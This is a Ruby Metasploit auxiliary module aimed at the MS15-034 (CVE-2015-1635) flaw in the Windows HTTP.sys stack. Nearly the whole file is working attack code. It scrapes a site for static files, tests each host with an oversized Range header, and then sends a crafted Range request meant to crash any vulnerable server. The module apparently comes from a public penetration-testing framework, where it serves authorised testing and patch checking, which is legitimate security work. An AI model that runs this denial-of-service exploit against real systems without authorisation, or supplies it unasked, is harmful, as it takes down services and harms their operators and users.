##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  # Watch out, dos all the things
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service',
      'Description'    => %q{
        This module will check if scanned hosts are vulnerable to CVE-2015-1635 (MS15-034), a
        vulnerability in the HTTP protocol stack (HTTP.sys) that could result in arbitrary code
        execution. This module will try to cause a denial-of-service.
      },
      'Author'         =>
        [
          # Bill did all the work (see the pastebin code), twitter: @hectorh56193716
          'Bill Finlayson',
          # MSF. But really, these people made it happen:
          # https://github.com/rapid7/metasploit-framework/pull/5150
          'sinn3r'
        ],
      'References'     =>
        [
          ['CVE', '2015-1635'],
          ['MSB', 'MS15-034'],
          ['URL', 'http://pastebin.com/ypURDPc4'],
          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150'],
          ['URL', 'https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection'],
          ['URL', 'http://www.securitysift.com/an-analysis-of-ms15-034/']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/'])
      ])

    deregister_options('RHOST')
  end

  def upper_range
    0xFFFFFFFFFFFFFFFF
  end

  def run_host(ip)
    if check_host(ip) == Exploit::CheckCode::Vulnerable
      dos_host(ip)
    else
      print_status("Probably not vulnerable, will not dos it.")
    end
  end

  # Needed to allow the vulnerable uri to be shared between the #check and #dos
  def target_uri
    @target_uri ||= super
  end

  def get_file_size(ip)
    @file_size ||= lambda {
      file_size = -1
      uri = normalize_uri(target_uri.path)
      res = send_request_raw('uri' => uri)

      unless res
        vprint_error("Connection timed out")
        return file_size
      end

      if res.code == 404
        vprint_error("You got a 404. URI must be a valid resource.")
        return file_size
      end

      file_size = res.body.length
      vprint_status("File length: #{file_size} bytes")

      return file_size
    }.call
  end

  def dos_host(ip)
    file_size = get_file_size(ip)
    lower_range = file_size - 2

    # In here we have to use Rex because if we dos it, it causes our module to hang too
    uri = normalize_uri(target_uri.path)
    begin
      cli = Rex::Proto::Http::Client.new(ip)
      cli.connect
      req = cli.request_raw(
        'uri' => uri,
        'method' => 'GET',
        'headers' => {
          'Range' => "bytes=#{lower_range}-#{upper_range}"
        }
      )
      cli.send_request(req)
    rescue ::Errno::EPIPE, ::Timeout::Error
      # Same exceptions the HttpClient mixin catches
    end
    print_status("DOS request sent")
  end

  def potential_static_files_uris
    uri = normalize_uri(target_uri.path)

    return [uri] unless uri[-1, 1] == '/'

    uris = ["#{uri}welcome.png"]
    res  = send_request_raw('uri' => uri, 'method' => 'GET')

    return uris unless res

    site_uri = URI.parse(full_uri)
    page     = Nokogiri::HTML(res.body.encode('UTF-8', invalid: :replace, undef: :replace))

    page.xpath('//link|//script|//style|//img').each do |tag|
      %w(href src).each do |attribute|
        attr_value = tag[attribute]

        next unless attr_value && !attr_value.empty?

        uri = site_uri.merge(URI.encode(attr_value.strip))

        next unless uri.host == vhost || uri.host == rhost

        uris << uri.path if uri.path =~ /\.[a-z]{2,}$/i # Only keep path with a file
      end
    end

    uris.uniq
  end

  def check_host(ip)
    potential_static_files_uris.each do |potential_uri|
      uri = normalize_uri(potential_uri)

      res = send_request_raw(
        'uri' => uri,
        'method' => 'GET',
        'headers' => {
          'Range' => "bytes=0-#{upper_range}"
        }
      )

      vmessage = "#{peer} - Checking #{uri} [#{res.code}]"

      if res && res.body.include?('Requested Range Not Satisfiable')
        vprint_status("#{vmessage} - Vulnerable")

        target_uri.path = uri # Needed for the DoS attack

        return Exploit::CheckCode::Vulnerable
      elsif res && res.body.include?('The request has an invalid header name')
        vprint_status("#{vmessage} - Safe")

        return Exploit::CheckCode::Safe
      else
        vprint_status("#{vmessage} - Unknown")
      end
    end

    Exploit::CheckCode::Unknown
  end
end
